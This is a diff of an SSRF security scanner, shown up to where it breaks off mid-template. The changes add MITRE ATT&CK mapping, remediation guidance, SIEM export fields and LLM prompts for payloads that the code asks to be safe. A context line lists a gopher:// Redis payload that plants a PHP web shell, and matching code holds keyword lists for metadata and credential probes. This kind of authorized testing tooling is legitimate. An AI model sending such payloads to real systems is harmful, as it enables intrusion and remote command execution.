@@ -109,6 +109,109 @@ DANGEROUS_SSRF_PAYLOADS = [
     "gopher://127.0.0.1:6379/_config%20set%20dir%20/var/www/html%0d%0aconfig%20set%20dbfilename%20cmd.php%0d%0aset%20payload%20%22%3C%3Fphp%20system($_GET['cmd'])%3B%3F%3E%22%0d%0asave%0d%0a",
 ]
 
+MITRE_ATTACK_LIBRARY = {
+    "T1190": {
+        "technique": "Exploit Public-Facing Application",
+        "tactic": "Initial Access",
+        "url": "https://attack.mitre.org/techniques/T1190/",
+        "atomic_red_team_path": "atomics/T1190/T1190.md",
+        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1190/T1190.md"
+    },
+    "T1595": {
+        "technique": "Active Scanning",
+        "tactic": "Reconnaissance",
+        "url": "https://attack.mitre.org/techniques/T1595/",
+        "atomic_red_team_path": "atomics/T1595/T1595.md",
+        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1595/T1595.md"
+    },
+    "T1046": {
+        "technique": "Network Service Discovery",
+        "tactic": "Discovery",
+        "url": "https://attack.mitre.org/techniques/T1046/",
+        "atomic_red_team_path": "atomics/T1046/T1046.md",
+        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md"
+    },
+    "T1552": {
+        "technique": "Unsecured Credentials",
+        "tactic": "Credential Access",
+        "url": "https://attack.mitre.org/techniques/T1552/",
+        "atomic_red_team_path": "atomics/T1552/T1552.md",
+        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552/T1552.md"
+    },
+    "T1552.005": {
+        "technique": "Cloud Instance Metadata API",
+        "tactic": "Credential Access",
+        "url": "https://attack.mitre.org/techniques/T1552/005/",
+        "atomic_red_team_path": "atomics/T1552.005/T1552.005.md",
+        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.005/T1552.005.md"
+    },
+    "T1528": {
+        "technique": "Steal Application Access Token",
+        "tactic": "Credential Access",
+        "url": "https://attack.mitre.org/techniques/T1528/",
+        "atomic_red_team_path": "atomics/T1528/T1528.md",
+        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md"
+    },
+    "T1613": {
+        "technique": "Container and Resource Discovery",
+        "tactic": "Discovery",
+        "url": "https://attack.mitre.org/techniques/T1613/",
+        "atomic_red_team_path": "atomics/T1613/T1613.md",
+        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1613/T1613.md"
+    },
+    "T1059": {
+        "technique": "Command and Scripting Interpreter",
+        "tactic": "Execution",
+        "url": "https://attack.mitre.org/techniques/T1059/",
+        "atomic_red_team_path": "atomics/T1059/T1059.md",
+        "atomic_red_team_url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059/T1059.md"
+    }
+}
+
+REMEDIATION_LIBRARY = {
+    "ssrf": [
+        "Use strict allowlists for outbound destinations instead of denylisting localhost or private ranges.",
+        "Normalize and parse URLs once with a safe parser before validation and before request execution.",
+        "Block loopback, link-local, multicast, private IP ranges, Unix sockets and unsupported schemes after DNS resolution.",
+        "Disable redirects or re-validate every redirect hop before following it.",
+        "Restrict outbound egress at network level from application servers and containers."
+    ],
+    "cloud_metadata": [
+        "Block access to 169.254.169.254, metadata.google.internal, 100.100.100.200 and cloud metadata aliases from application workloads.",
+        "Require AWS IMDSv2 and set hop limit to 1 where possible.",
+        "Use least-privilege instance profiles and short-lived credentials.",
+        "Monitor metadata service access from application processes."
+    ],
+    "credential_disclosure": [
+        "Remove secrets from web-accessible files and source-controlled configuration files.",
+        "Move secrets to a managed secret store and rotate exposed credentials immediately.",
+        "Prevent PHP/config/source files from being served or read through user-controlled paths.",
+        "Add secret scanning in CI and runtime log redaction."
+    ],
+    "internal_discovery": [
+        "Segment internal services and require authentication on admin panels and service-mesh control ports.",
+        "Block server-side requests to RFC1918, loopback and link-local networks unless explicitly required.",
+        "Add egress firewall rules and service-to-service policy enforcement."
+    ],
+    "kubernetes": [
+        "Disable unnecessary service account token automounting.",
+        "Apply Kubernetes NetworkPolicies to restrict pod egress.",
+        "Restrict access to kubernetes.default.svc and service account token paths.",
+        "Use least-privilege RBAC for workloads."
+    ],
+    "protocol_abuse": [
+        "Allow only http and https schemes unless another scheme is explicitly required.",
+        "Disable gopher, dict, ftp, file, ldap and other non-web protocols in URL fetchers.",
+        "Validate scheme after decoding and normalization."
+    ],
+    "header_injection": [
+        "Reject CRLF characters and control characters in URL inputs and headers.",
+        "Use safe HTTP client libraries that prevent header injection by default.",
+        "Log and alert on malformed outbound request attempts."
+    ]
+}
+
+
 THM_LOCAL_SSRF_PAYLOADS = [
     "localhost/copyright",
     "localhost/hello",
@@ -194,6 +297,7 @@ def setup_argparse():
     export_group.add_argument("--export-siem", action="store_true")
     export_group.add_argument("--export-json-api", action="store_true")
     export_group.add_argument("--attack-map", action="store_true")
+    export_group.add_argument("--export-mitre", action="store_true", help="Export MITRE ATT&CK mapping and remediation guidance")
     export_group.add_argument("--output", "-o", default=".")
     return parser
 
@@ -450,10 +554,12 @@ class AISkills:
 
     async def generate_payloads(self, context: dict) -> List[str]:
         sys = (
-            "Generate safe SSRF and endpoint-validation payloads. "
-            "Return JSON array of strings only. "
-            "Cover OAST, localhost, metadata, redirects, encoded IPs, IPv6, parser bypasses, bad schemes, malformed URLs and edge cases. "
-            "No destructive payloads."
+            "Generate safe web/API validation payloads for an authorized scanner. "
+            "Return only a JSON array of strings. No prose. "
+            "Cover SSRF, OAST callbacks, localhost, cloud metadata read-only probes, redirects, "
+            "encoded IPs, IPv6, URL parser bypasses, bad schemes, malformed URLs, webhook callback checks, "
+            "read-only config paths, harmless API edge cases and endpoint error validation. "
+            "No destructive payloads, command execution, credential theft, persistence, brute force or data modification."
         )
         usr = json.dumps(
             {
@@ -461,9 +567,9 @@ class AISkills:
                 "waf": context.get("waf", "none"),
                 "cloud": context.get("cloud", "unknown"),
                 "callback": context.get("callback_host", ""),
-                "endpoints": context.get("endpoints", [])[:10],
-                "params": context.get("params", [])[:20],
-                "count": 15,
+                "endpoints": context.get("endpoints", [])[:20],
+                "params": context.get("params", [])[:30],
+                "count": 20,
             },
             ensure_ascii=False,
         )
@@ -477,7 +583,8 @@ class AISkills:
                     parsed = json.loads(match.group())
                     if isinstance(parsed, list):
                         llm_payloads = [str(item).strip() for item in parsed if str(item).strip()]
-            except Exception: pass
+            except Exception:
+                pass
 
         self.last_llm_payloads = llm_payloads
         combined = DEFAULT_SSRF_PAYLOADS.copy()
@@ -486,50 +593,110 @@ class AISkills:
         for payload in llm_payloads:
             if payload not in combined:
                 combined.append(payload)
-        return combined[:40]
+        return combined[:60]
 
     async def suggest_additional_tests(self, context: dict) -> List[dict]:
         sys = (
-            "You are assisting an authorized web security scanner. "
-            "Suggest safe, non-destructive validation checks based on discovered endpoints and parameters. "
-            "Return only a JSON array of objects. "
+            "Suggest safe non-destructive web/API security validation checks for an authorized scanner. "
+            "Return only a JSON array of objects. No prose. "
             "Allowed issue_type values: ssrf, open_redirect, cors_misconfig, header_injection, "
-            "path_traversal_readonly, information_disclosure, authz_review. "
-            "Do not suggest destructive tests. "
-            "Each object must contain: issue_type, endpoint, param, reason, safe_test_value."
+            "host_header_injection, path_traversal_readonly, lfi_readonly, information_disclosure, "
+            "debug_endpoint, exposed_config, exposed_backup_file, exposed_admin_panel, idor_review, "
+            "authz_review, mass_assignment_review, api_versioning_issue, graphql_introspection, "
+            "graphql_ssrf_review, jwt_misconfig_review, cache_poisoning_review, request_smuggling_review, "
+            "webhook_ssrf_review, file_upload_review, redirect_uri_review, oauth_misconfig_review, "
+            "cloud_metadata_review, k8s_exposure_review, service_mesh_exposure_review. "
+            "Do not suggest destructive tests, brute force, credential attacks, account takeover, command execution, "
+            "web shells, persistence, malware, data deletion or data modification. "
+            "Each object must contain: issue_type, endpoint, param, reason, safe_test_value, expected_signal, remediation_hint. "
+            "safe_test_value must be benign: marker string, callback URL, localhost read-only path, or harmless validation payload."
         )
-        usr = json.dumps({
-            "target": context.get("target"),
-            "callback_host": context.get("callback_host"),
-            "endpoints": context.get("endpoints", []),
-            "params": context.get("params", []),
-            "waf": context.get("waf"),
-            "cloud": context.get("cloud"),
-        }, indent=2, ensure_ascii=False)
+        usr = json.dumps(
+            {
+                "target": context.get("target"),
+                "callback_host": context.get("callback_host"),
+                "endpoints": context.get("endpoints", [])[:20],
+                "params": context.get("params", [])[:30],
+                "waf": context.get("waf"),
+                "cloud": context.get("cloud"),
+                "observed_status_codes": context.get("status_codes", []),
+                "observed_content_types": context.get("content_types", []),
+                "known_context": context.get("known_context", ""),
+            },
+            indent=2,
+            ensure_ascii=False,
+        )
         resp = await self.llm.generate(sys, usr)
-        if not resp: return []
+        if not resp:
+            return []
         try:
             match = re.search(r'\[.*\]', resp, re.DOTALL)
-            if not match: return []
+            if not match:
+                return []
             parsed = json.loads(match.group())
-            if not isinstance(parsed, list): return []
-            allowed = {"ssrf","open_redirect","cors_misconfig","header_injection","path_traversal_readonly","information_disclosure","authz_review"}
+            if not isinstance(parsed, list):
+                return []
+            allowed = {
+                "ssrf",
+                "open_redirect",
+                "cors_misconfig",
+                "header_injection",
+                "host_header_injection",
+                "path_traversal_readonly",
+                "lfi_readonly",
+                "information_disclosure",
+                "debug_endpoint",
+                "exposed_config",
+                "exposed_backup_file",
+                "exposed_admin_panel",
+                "idor_review",
+                "authz_review",
+                "mass_assignment_review",
+                "api_versioning_issue",
+                "graphql_introspection",
+                "graphql_ssrf_review",
+                "jwt_misconfig_review",
+                "cache_poisoning_review",
+                "request_smuggling_review",
+                "webhook_ssrf_review",
+                "file_upload_review",
+                "redirect_uri_review",
+                "oauth_misconfig_review",
+                "cloud_metadata_review",
+                "k8s_exposure_review",
+                "service_mesh_exposure_review",
+            }
             suggestions = []
-            for item in parsed[:15]:
-                if not isinstance(item, dict): continue
-                issue_type = str(item.get("issue_type","")).strip().lower()
-                endpoint = str(item.get("endpoint","")).strip()
-                param = str(item.get("param","")).strip()
-                reason = str(item.get("reason","")).strip()
-                safe_test_value = str(item.get("safe_test_value","")).strip()
-                if issue_type not in allowed or not endpoint.startswith("/") or not param:
+            for item in parsed[:20]:
+                if not isinstance(item, dict):
                     continue
-                suggestions.append({
-                    "issue_type": issue_type, "endpoint": endpoint, "param": param,
-                    "reason": reason, "safe_test_value": safe_test_value
-                })
+                issue_type = str(item.get("issue_type", "")).strip().lower()
+                endpoint = str(item.get("endpoint", "")).strip()
+                param = str(item.get("param", "")).strip()
+                reason = str(item.get("reason", "")).strip()
+                safe_test_value = str(item.get("safe_test_value", "")).strip()
+                expected_signal = str(item.get("expected_signal", "")).strip()
+                remediation_hint = str(item.get("remediation_hint", "")).strip()
+                if issue_type not in allowed:
+                    continue
+                if not endpoint.startswith("/"):
+                    continue
+                if not param:
+                    continue
+                suggestions.append(
+                    {
+                        "issue_type": issue_type,
+                        "endpoint": endpoint,
+                        "param": param,
+                        "reason": reason,
+                        "safe_test_value": safe_test_value,
+                        "expected_signal": expected_signal,
+                        "remediation_hint": remediation_hint,
+                    }
+                )
             return suggestions
-        except Exception: return []
+        except Exception:
+            return []
 
     async def triage(self, findings: List[dict]) -> Optional[str]:
         sys = (
@@ -656,6 +823,7 @@ class UltimateSSRFFramework:
         self.do_export_siem = args.export_siem
         self.do_export_json_api = args.export_json_api
         self.do_attack_map = args.attack_map
+        self.do_export_mitre = getattr(args, "export_mitre", False)
 
         self.output_dir = Path(args.output)
         self.output_dir.mkdir(parents=True, exist_ok=True)
@@ -1196,7 +1364,10 @@ class UltimateSSRFFramework:
                 s, b, h = await self.request("GET", url)
                 self.other_issue_attempts.append({
                     "issue_type": suggestion["issue_type"], "endpoint": ep.path,
-                    "param": suggestion["param"], "payload": value, "status": s, "result": "manual_review"
+                    "param": suggestion["param"], "payload": value, "status": s, "result": "manual_review",
+                    "reason": suggestion.get("reason"),
+                    "expected_signal": suggestion.get("expected_signal"),
+                    "remediation_hint": suggestion.get("remediation_hint")
                 })
 
 
@@ -1302,6 +1473,164 @@ class UltimateSSRFFramework:
         if self.verbose:
             print(f"  {OK} AI payloads saved: {payload_log}")
 
+    def _mitre_ids_for_signal(self, text, phase="", technique="", payload="", endpoint=""):
+        blob = " ".join(str(x or "") for x in (text, phase, technique, payload, endpoint)).lower()
+        ids = {"T1190"}
+        if any(x in blob for x in ("scan", "probe", "crawler", "discovery")):
+            ids.add("T1595")
+        if any(x in blob for x in ("127.0.0.1", "localhost", "0.0.0.0", "[::1]", "internal ip", "10.", "192.168", "172.")):
+            ids.add("T1046")
+        if any(x in blob for x in ("169.254.169.254", "metadata.google.internal", "metadata", "iam/security-credentials", "service-accounts", "100.100.100.200")):
+            ids.add("T1552.005")
+            ids.add("T1528")
+        if any(x in blob for x in ("username", "password", "secret", "token", "api_key", "apikey", "private key", "db_password", "credential")):
+            ids.add("T1552")
+        if any(x in blob for x in ("kubernetes", "k8s", "serviceaccount", "kubernetes.default.svc", "namespace", "pod")):
+            ids.add("T1613")
+        if any(x in blob for x in ("gopher://", "dict://", "redis", "smtp", "command", "shell")):
+            ids.add("T1059")
+        return sorted(ids)
+
+    def _remediation_keys_for_signal(self, text, phase="", technique="", payload="", endpoint=""):
+        blob = " ".join(str(x or "") for x in (text, phase, technique, payload, endpoint)).lower()
+        keys = {"ssrf"}
+        if any(x in blob for x in ("169.254.169.254", "metadata.google.internal", "metadata", "iam/security-credentials", "100.100.100.200")):
+            keys.add("cloud_metadata")
+        if any(x in blob for x in ("username", "password", "secret", "token", "api_key", "private key", "db_password", "credential")):
+            keys.add("credential_disclosure")
+        if any(x in blob for x in ("127.0.0.1", "localhost", "internal ip", "10.", "192.168", "172.")):
+            keys.add("internal_discovery")
+        if any(x in blob for x in ("kubernetes", "k8s", "serviceaccount", "kubernetes.default.svc")):
+            keys.add("kubernetes")
+        if any(x in blob for x in ("gopher://", "dict://", "ftp://", "file://", "ldap://")):
+            keys.add("protocol_abuse")
+        if any(x in blob for x in ("%0d", "%0a", "crlf", "x-injected", "header")):
+            keys.add("header_injection")
+        return sorted(keys)
+
+    def _mitre_objects(self, mitre_ids):
+        return [{"id": mid, **MITRE_ATTACK_LIBRARY.get(mid, {"technique": "Unknown", "tactic": "Unknown", "url": "", "atomic_red_team_path": "", "atomic_red_team_url": ""})} for mid in mitre_ids]
+
+    def _remediation_items(self, keys):
+        items = []
+        seen = set()
+        for key in keys:
+            for item in REMEDIATION_LIBRARY.get(key, []):
+                if item not in seen:
+                    seen.add(item)
+                    items.append({"category": key, "recommendation": item})
+        return items
+
+    def _mitre_record_for_attempt(self, attempt):
+        patterns = ", ".join(attempt.matched_patterns or [])
+        ids = self._mitre_ids_for_signal(patterns, attempt.phase, attempt.technique, attempt.payload, attempt.endpoint)
+        remediation_keys = self._remediation_keys_for_signal(patterns, attempt.phase, attempt.technique, attempt.payload, attempt.endpoint)
+        return {
+            "source": "attempt",
+            "target": self.target,
+            "endpoint": attempt.endpoint,
+            "param": attempt.param,
+            "payload": attempt.payload,
+            "tested_url": attempt.tested_url,
+            "status": attempt.status,
+            "result": attempt.result,
+            "severity": attempt.severity,
+            "confidence": attempt.confidence,
+            "vulnerable": attempt.vulnerable,
+            "matched_patterns": attempt.matched_patterns or [],
+            "mitre_attack": self._mitre_objects(ids),
+            "remediations": self._remediation_items(remediation_keys)
+        }
+
+    def _mitre_record_for_evidence(self, ev):
+        patterns = ", ".join(ev.matched_patterns or [])
+        ids = self._mitre_ids_for_signal(patterns, ev.phase, ev.technique, ev.payload, ev.endpoint)
+        remediation_keys = self._remediation_keys_for_signal(patterns, ev.phase, ev.technique, ev.payload, ev.endpoint)
+        return {
+            "source": "evidence",
+            "target": self.target,
+            "endpoint": ev.endpoint,
+            "param": ev.param,
+            "payload": ev.payload,
+            "url": ev.url,
+            "status": ev.status,
+            "severity": ev.severity,
+            "impact_score": ev.impact_score,
+            "out_of_band_hit": ev.out_of_band_hit,
+            "matched_patterns": ev.matched_patterns,
+            "mitre_attack": self._mitre_objects(ids),
+            "remediations": self._remediation_items(remediation_keys)
+        }
+
+    def build_mitre_report(self):
+        evidence_records = [self._mitre_record_for_evidence(ev) for ev in self.evidence]
+        attempt_records = [self._mitre_record_for_attempt(a) for a in self.scan_attempts]
+        all_records = evidence_records + attempt_records
+        techniques = {}
+        remediations = {}
+        for record in all_records:
+            for tech in record.get("mitre_attack", []):
+                tid = tech.get("id")
+                if tid:
+                    techniques[tid] = tech
+            for item in record.get("remediations", []):
+                key = item.get("category")
+                remediations.setdefault(key, [])
+                if item not in remediations[key]:
+                    remediations[key].append(item)
+        return {
+            "target": self.target,
+            "timestamp": datetime.now().isoformat(),
+            "framework_version": "5.0-waf-aware",
+            "status": "vulnerable" if any(a.vulnerable for a in self.scan_attempts) or self.evidence else "not_confirmed",
+            "note": "MITRE ATT&CK mapping is defensive context for triage and detection engineering. It does not mean the scanner executed Atomic Red Team tests.",
+            "atomic_red_team_reference": "https://github.com/redcanaryco/atomic-red-team",
+            "summary": {
+                "techniques": list(techniques.values()),
+                "remediation_categories": sorted(remediations.keys()),
+                "total_records": len(all_records),
+                "confirmed_evidence_records": len(evidence_records)
+            },
+            "records": all_records,
+            "remediation_plan": remediations
+        }
+
+    def export_mitre_attack(self):
+        if not self.do_export_mitre:
+            return
+        data = self.build_mitre_report()
+        safe_target = self._safe_target_name()
+        json_file = self.output_dir / f"mitre_attack_{safe_target}.json"
+        md_file = self.output_dir / f"remediation_{safe_target}.md"
+        with open(json_file, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
+        lines = [
+            f"# MITRE ATT&CK Mapping and Remediation - {self.target}",
+            "",
+            f"Generated: {data['timestamp']}",
+            "",
+            "## MITRE ATT&CK Techniques",
+            ""
+        ]
+        for tech in data["summary"]["techniques"]:
+            lines.append(f"- **{tech.get('id')} - {tech.get('technique')}** ({tech.get('tactic')})")
+            if tech.get("url"):
+                lines.append(f"  - MITRE: {tech.get('url')}")
+            if tech.get("atomic_red_team_url"):
+                lines.append(f"  - Atomic Red Team reference: {tech.get('atomic_red_team_url')}")
+        lines.extend(["", "## Remediation Plan", ""])
+        for category, items in data["remediation_plan"].items():
+            lines.append(f"### {category}")
+            for item in items:
+                lines.append(f"- {item.get('recommendation')}")
+            lines.append("")
+        lines.extend(["## Important Note", "", "This file maps SSRF findings to defensive MITRE ATT&CK context and remediation guidance. It does not run Atomic Red Team tests."])
+        with open(md_file, "w", encoding="utf-8") as f:
+            f.write("\n".join(lines))
+        if self.verbose:
+            print(f"  {OK} MITRE ATT&CK export: {json_file}")
+            print(f"  {OK} Remediation export: {md_file}")
+
     def export_nuclei(self):
         if not self.do_export_nuclei:
             return
@@ -1365,6 +1694,11 @@ class UltimateSSRFFramework:
                 f"cn1Label=http_status cn1={attempt.status} "
                 f"cs6Label=vulnerable cs6={esc(attempt.vulnerable)}"
             )
+            mitre_record = self._mitre_record_for_attempt(attempt)
+            mitre_ids = ",".join(t.get("id", "") for t in mitre_record.get("mitre_attack", []))
+            remediation = mitre_record.get("remediations", [{}])[0].get("recommendation", "") if mitre_record.get("remediations") else ""
+            cef += f" flexString1Label=mitre_techniques flexString1={esc(mitre_ids)}"
+            cef += f" flexString2Label=primary_remediation flexString2={esc(remediation)}"
             if attempt.error:
                 cef += f" msg={esc(attempt.error)}"
             entries.append(cef)
@@ -1379,6 +1713,11 @@ class UltimateSSRFFramework:
                 f"cs5Label=oob cs5={esc(ev.out_of_band_hit)} "
                 f"cn1Label=impact_score cn1={int(ev.impact_score)}"
             )
+            mitre_record = self._mitre_record_for_evidence(ev)
+            mitre_ids = ",".join(t.get("id", "") for t in mitre_record.get("mitre_attack", []))
+            remediation = mitre_record.get("remediations", [{}])[0].get("recommendation", "") if mitre_record.get("remediations") else ""
+            cef += f" flexString1Label=mitre_techniques flexString1={esc(mitre_ids)}"
+            cef += f" flexString2Label=primary_remediation flexString2={esc(remediation)}"
             entries.append(cef)
         for item in self.other_issue_attempts:
             cef = f"CEF:0|SSRFFramework|UltimateSSRF|5.0|AI_SAFE_CHECK|{esc(item.get('issue_type'))}|{esc(item.get('result'))}|"
@@ -1434,7 +1773,8 @@ class UltimateSSRFFramework:
             "callbacks_detail": dict(self.callbacks),
             "internal_ips": list(self.internal_ips),
             "ai_suggestions": self.ai_suggestions,
-            "other_issue_attempts": self.other_issue_attempts
+            "other_issue_attempts": self.other_issue_attempts,
+            "mitre_attack": self.build_mitre_report()
         }
         report_file = self.output_dir / f"api_report_{self._safe_target_name()}.json"
         with open(report_file, "w", encoding="utf-8") as f:
@@ -1458,6 +1798,12 @@ class UltimateSSRFFramework:
             attempt_id = f"attempt-{index}"
             G.add_node(attempt_id, type="attempt", endpoint=attempt.endpoint, param=attempt.param, payload=attempt.payload, result=attempt.result, vulnerable=str(attempt.vulnerable), status=str(attempt.status))
             G.add_edge(self.target, attempt_id, relation="tested")
+            mitre_record = self._mitre_record_for_attempt(attempt)
+            for tech in mitre_record.get("mitre_attack", []):
+                tech_id = tech.get("id")
+                if tech_id:
+                    G.add_node(tech_id, type="mitre_attack", technique=tech.get("technique"), tactic=tech.get("tactic"), url=tech.get("url"))
+                    G.add_edge(attempt_id, tech_id, relation="mapped-to")
             if attempt.vulnerable:
                 payload_id = f"payload-{index}"
                 G.add_node(payload_id, type="payload", value=attempt.payload, severity=attempt.severity)
@@ -1475,33 +1821,159 @@ class UltimateSSRFFramework:
         if not JINJA2_AVAILABLE:
             return
         deduped = self._dedup()
-        vulns = [{"endpoint": ep or "unknown", "param": param or "callback", "severity": info["max_sev"], "oob": info["oob"]} for (ep, param), info in deduped.items()]
-        attempts = [asdict(attempt) for attempt in self.scan_attempts[:350]]
-        vulnerable = any(attempt.get("vulnerable") for attempt in attempts) or bool(self.evidence)
+        attempts = [asdict(attempt) for attempt in self.scan_attempts[:500]]
+        evidence_items = [asdict(ev) for ev in self.evidence]
+        vulnerable_attempts = [attempt for attempt in attempts if attempt.get("vulnerable")]
         errors = [attempt for attempt in attempts if attempt.get("result") == "error"]
         not_confirmed = [attempt for attempt in attempts if attempt.get("result") == "not_confirmed"]
+        suspected = [item for item in self.other_issue_attempts if item.get("result") in ("suspected_other_issue", "manual_review")]
+        vulnerable = bool(vulnerable_attempts) or bool(self.evidence)
+        status_label = "VALIDATED FINDING" if vulnerable else "NO CONFIRMED SSRF"
+        report_confidence = "High" if any(ev.get("out_of_band_hit") for ev in evidence_items) else "Medium" if vulnerable else "Low"
+        mitre_report = self.build_mitre_report()
+        vulns = []
+        for (ep, param), info in deduped.items():
+            samples = []
+            for ev in info.get("items", [])[:5]:
+                samples.append({
+                    "url": ev.url,
+                    "payload": ev.payload,
+                    "status": ev.status,
+                    "severity": ev.severity,
+                    "patterns": ev.matched_patterns,
+                    "body_snippet": ev.body_snippet,
+                    "out_of_band_hit": ev.out_of_band_hit,
+                    "impact_score": ev.impact_score,
+                })
+            vulns.append({
+                "endpoint": ep or "unknown",
+                "param": param or "callback",
+                "severity": info["max_sev"],
+                "count": info["count"],
+                "oob": info["oob"],
+                "samples": samples,
+            })
+        remediation_flat = []
+        for category, items in mitre_report.get("remediation_plan", {}).items():
+            for item in items:
+                remediation_flat.append({
+                    "category": category,
+                    "priority": item.get("priority", "Medium"),
+                    "recommendation": item.get("recommendation", ""),
+                    "details": item.get("details", ""),
+                })
         html = Template("""
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>SSRF Report - {{target}}</title>
+<meta charset="utf-8">
+<title>Security Validation Report - {{target}}</title>
 <style>
-body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:10px;margin-bottom:20px}.card{background:#16213e;padding:20px;border-radius:10px;margin:10px 0}.critical{color:#ff4444}.high{color:#ff8c00}.medium{color:#ffd700}.info{color:#8ab4f8}table{width:100%;border-collapse:collapse;font-size:13px}th{background:#0f3460;padding:10px;text-align:left}td{padding:8px;border-bottom:1px solid #333;vertical-align:top;word-break:break-word}.badge{padding:4px 8px;border-radius:4px;font-size:12px;display:inline-block}.badge-critical{background:#ff4444;color:#fff}.badge-high{background:#ff8c00;color:#fff}.badge-medium{background:#ffd700;color:#000}.badge-info{background:#444;color:#fff}.badge-vulnerable{background:#ff4444;color:#fff}.badge-not_confirmed{background:#555;color:#fff}.badge-error{background:#8b0000;color:#fff}.badge-suspected_other_issue{background:#d97706;color:#fff}.badge-manual_review{background:#2563eb;color:#fff}code{color:#9cdcfe}
+:root{--bg:#0b1020;--panel:#121a33;--panel2:#17213f;--text:#e8eefc;--muted:#9fb0d0;--border:#2b3a63;--critical:#ef4444;--high:#f97316;--medium:#eab308;--low:#22c55e;--info:#60a5fa;--purple:#8b5cf6}*{box-sizing:border-box}body{margin:0;font-family:Inter,Segoe UI,Arial,sans-serif;background:var(--bg);color:var(--text);line-height:1.5}.wrap{max-width:1320px;margin:0 auto;padding:28px}.hero{background:linear-gradient(135deg,#1d4ed8,#7c3aed);border-radius:18px;padding:30px;margin-bottom:20px;box-shadow:0 20px 60px rgba(0,0,0,.25)}.hero h1{margin:0;font-size:34px}.hero p{margin:8px 0 0;color:#eef2ff}.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:18px 0}.metric{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:16px}.metric .num{font-size:28px;font-weight:800}.metric .label{color:var(--muted);font-size:13px}.card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:20px;margin:16px 0}.card h2{margin-top:0;font-size:22px}.card h3{margin-bottom:8px}.muted{color:var(--muted)}table{width:100%;border-collapse:collapse;font-size:13px;overflow:hidden;border-radius:10px}th{background:#0f1a35;color:#cfe0ff;text-align:left;padding:10px;border-bottom:1px solid var(--border)}td{padding:10px;border-bottom:1px solid var(--border);vertical-align:top;word-break:break-word}.badge{display:inline-block;padding:4px 9px;border-radius:999px;font-size:12px;font-weight:700}.badge-critical,.badge-vulnerable{background:var(--critical);color:white}.badge-high{background:var(--high);color:white}.badge-medium,.badge-manual_review,.badge-suspected_other_issue{background:var(--medium);color:#111827}.badge-low{background:var(--low);color:#06210f}.badge-info,.badge-not_confirmed{background:#334155;color:#dbeafe}.badge-error{background:#7f1d1d;color:white}.badge-ok{background:#166534;color:white}.code,code,pre{font-family:Consolas,Monaco,monospace}.code{background:#090f1f;border:1px solid #26385f;color:#c7e0ff;border-radius:8px;padding:8px;display:block;white-space:pre-wrap;max-height:220px;overflow:auto}.section-note{background:#101a35;border-left:4px solid var(--info);padding:12px;border-radius:8px;color:#dbeafe}.toc a{color:#93c5fd;text-decoration:none;margin-right:14px}.risk{font-size:16px}.footer{color:var(--muted);font-size:12px;text-align:center;margin:28px 0}.print-note{display:none}@media(max-width:900px){.grid{grid-template-columns:repeat(2,1fr)}}@media print{body{background:white;color:#111827}.wrap{max-width:none;padding:12px}.hero,.card,.metric{box-shadow:none;background:white;color:#111827;border:1px solid #d1d5db}.muted,.footer{color:#374151}.code{background:#f3f4f6;color:#111827;border:1px solid #d1d5db}.badge-not_confirmed,.badge-info{background:#e5e7eb;color:#111827}.print-note{display:block}}
 </style>
 </head>
 <body>
-<div class="header"><h1>Ultimate SSRF Framework v5.0 Report</h1><p>Target: <strong>{{target}}</strong></p><p>Date: {{date}}</p><p>Status: {% if vulnerable %}<span class="badge badge-vulnerable">VULNERABLE / CONFIRMED SIGNAL</span>{% else %}<span class="badge badge-not_confirmed">NOT CONFIRMED</span>{% endif %}</p></div>
-<div class="card"><h2>Summary</h2><p>WAF: {{waf}}</p><p>Cloud: {{cloud}}</p><p>Endpoints: {{endpoints}}</p><p>Findings: {{findings}} raw / {{unique}} unique</p><p>Callbacks: {{callbacks}}</p><p>Total Attempts: {{attempts|length}}</p><p>Not Confirmed: {{not_confirmed|length}}</p><p>Errors: {{errors|length}}</p></div>
-<div class="card"><h2>Confirmed Findings</h2><table><tr><th>Endpoint</th><th>Parameter</th><th>Severity</th><th>Callbacks</th></tr>{% for v in vulns %}<tr><td>{{v.endpoint}}</td><td>{{v.param}}</td><td><span class="badge badge-{{v.severity}}">{{v.severity.upper()}}</span></td><td>{{v.oob}}</td></tr>{% endfor %}</table></div>
-<div class="card"><h2>Payload Attempts</h2><table><tr><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Payload</th><th>Evidence / Error</th><th>Response Snippet</th></tr>{% for a in attempts %}<tr><td><span class="badge badge-{{a.result}}">{{a.result}}</span></td><td>{{a.status}}</td><td>{{a.endpoint}}</td><td>{{a.param}}</td><td><code>{{a.payload}}</code></td><td>{% if a.matched_patterns %}{{a.matched_patterns | join(", ") }}{% elif a.error %}{{a.error}}{% else %}No SSRF evidence confirmed for this payload.{% endif %}</td><td><code>{{a.body_snippet}}</code></td></tr>{% endfor %}</table></div>
-<div class="card"><h2>AI Suggested Safe Checks</h2><table><tr><th>Issue Type</th><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Evidence / Reason</th></tr>{% for item in other_issue_attempts %}<tr><td>{{item.issue_type}}</td><td><span class="badge badge-{{item.result}}">{{item.result}}</span></td><td>{{item.status}}</td><td>{{item.endpoint}}</td><td>{{item.param}}</td><td>{% if item.evidence %}{{item.evidence | join(", ") }}{% else %}{{item.reason}}{% endif %}</td></tr>{% endfor %}</table></div>
+<div class="wrap">
+<div class="hero">
+<h1>Security Validation Report</h1>
+<p><strong>Target:</strong> {{target}} · <strong>Generated:</strong> {{date}} · <strong>Tool:</strong> Ultimate SSRF Framework v5.0</p>
